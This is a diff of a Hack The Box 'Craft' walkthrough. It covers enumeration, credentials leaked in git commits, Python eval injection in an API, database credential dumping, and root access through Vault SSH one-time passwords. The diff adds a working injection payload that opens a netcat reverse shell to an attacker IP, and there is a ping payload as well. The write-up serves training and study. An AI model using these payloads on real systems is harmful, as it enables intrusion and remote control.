@@ -1,6 +1,6 @@
-Victim IP: 10.10.10.110
-Victim OS: Linux
+# 						  Craft - Hack The Box WalkThrough
 
+### Victim IP: 10.10.10.110 Victim OS: Linux
 ### Enumeration - Namp
 ```
 nmap -sV -sC -oA nmap_full -p1,65535 10.10.10.110
@@ -41,7 +41,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### Enumerating the web page - https://craft.htb
 ![homepage](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/1_test.py.png)
 
-The “API” link points to api.craft.htb and the “Sign in” button to “gogs.craft.htb” therefore we add these as entries to our hosts file in other to be able to resolve and reach them.
+The "API" link points to api.craft.htb and the "Sign in" button to "gogs.craft.htb" therefore we add these as entries to our hosts file in other to be able to resolve and reach them.
 
 ### Enumeration - https://api.craft.htb
 Small API with basic GET, POST, PUT, DELETE actions, might be an interesting point of entry.
@@ -49,64 +49,53 @@ Authentication required for POST, PUT
 ![api_craft](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/api_craft.png)
 
 ### Enumeration - https://gogs.craft.htb
-Repository housing the code and content for api.craft.htb.
-Reviewing all commits and merge requests, dinesh’s credentials were accidentally commited and removed. 
+![gogs](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/gogs_craft.png)
+Repository housing the code and content for api.craft.htb:
+![commits](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/craft_api_repo.png)
+Reviewing all issues,commits and merge requests, dinesh’s credentials were accidentally commited and removed: 
 ![dinesh_creds](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/dinesh_creds.png)
+The issue fix by dinesh also shows a dangerous python function (eval):
+![eval_in_issue_fix](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/eval_in_issue_fix.png)
+The eval command resides in the POST brew function in brew.py and accepts user input.
 
-The credentials can be used in test.py
+The discovered credentials can be used in test.py
 ![1_test.py](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/1_test.py.png)
 
-Reviewing more code in the repository and especially the functions for the POST and PUT API options  leads to finding a vulnerable python function “eval”. The issue fix by dinesh also shows this function
-![eval_in_issue_fix](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/eval_in_issue_fix.png)
-
-This function resides in the POST brew function in brew.py.
 
 ### Initial foothold - Exploiting python eval function
 Test 1: On local system:
 ![Test 1](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/test1.png)
 
 That works.
-Test 2: with a similar “if” statement like in test.py:
-![Test 2](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/test2.png)
+Test 2: with a similar "if" statement like in test.py:
+![Test 2](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/test2.png)
 
 That works too, however there is no result returned when it is tried on the victim end.
 
 Test 3: Ping from victim to local machine:
-![Test 3](https://github.com/zomy22/zomy22.github.io/tree/master/hackthebox/craft_images/test3.png)
-
-	```
-  tcpdump -i tun0 -nnv icmp
-  ```
-	Payload (test.py): 
-	```
-  brew_dict['abv'] = '__import__("os").system("ping -c 3 10.10.14.4")' 
-  ```
-
-Try 4. Reverse shell (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
+tcpdump -i tun0 -nnv icmp
+Payload (test.py): 
+```brew_dict['abv'] = '__import__("os").system("ping -c 3 10.10.14.4")' ```
+ 
+Test 4. Reverse shell (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
 Several failed till the netcat (without -e) option.
 	The payload becomes: 
-  <screen_shot>
+	brew_dict['abv'] = '__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4445 >/tmp/f")'
+![Test 4](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/test3.png)
 
-It’s says root! Well that was easy! 
-But wait no user.txt or root.txt flags. Of course it couldn’t be that easy :( 
+It's says root! Well that was easy! 
+But wait no user.txt or root.txt flags. Of course it couldn’t be that easy 
 
-Running “cat /etc/issue”, LinEnum and linuxprivchecker again show that we are in a docker container
+Running "cat /etc/issue", LinEnum and linuxprivchecker again show that we are in a docker container
 Release: Alpine Linux 3.9
 
 ### Obtaining User privileges  – user.txt
 Dump database credentials – dbtest.py
+![dbtest.py](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/dbtest.py.png)
 
 Modify the SQL in the try statement to select all users from the database
-```try: 
-    with connection.cursor() as cursor:
-        sql = "SELECT * from user" # show tables. 
-        cursor.execute(sql)
-        result = cursor.fetchall() #change from fetchone to fetchall
-        print(result)
+![db_dump](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/dump_users.png)
 
-finally:
-    connection.close()
-```
 Authenticate with discovered credentials and enumerate the git repository
 All commits/merge requests ==> ssh private key, vault write commands …
 <screenshot>
@@ -117,20 +106,17 @@ For now authenticate with the SSH private key and enter gilfoyle’s password (d
 After obtaining user access on the machine more enumeration is required to discover interesting escalation vectors. Running linuxenum and privesc scripts did not recover any vulnerabilities right away but did point out the vault write.
 
 ### Exploring vault:
-<screen_shot>
+![vault_secrets](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/vault_secrets_list.png)
 
 Gilfoyle’s OTP setup:
-<screen_shot>
-
+![otp_setup](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/vault_write_ssh_otp.png)
 
 Reviewing the SSH Secrets Engine Documentation: https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html 
 gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
-<screenshot>
-
-
+![vault_write_ssh_otp](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/vault_write_ssh_otp_new.png)
 
 Then SSH to the host using the generated key and the root user:
-<screenshot>
+![root.txt](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/root.txt.png)
 
 Conclusion:
 This machine simulates a lot of real world scenarios. I was delighted at every discovery, learned a lot and reminded myself once again the importance of enumeration during a penetration test.
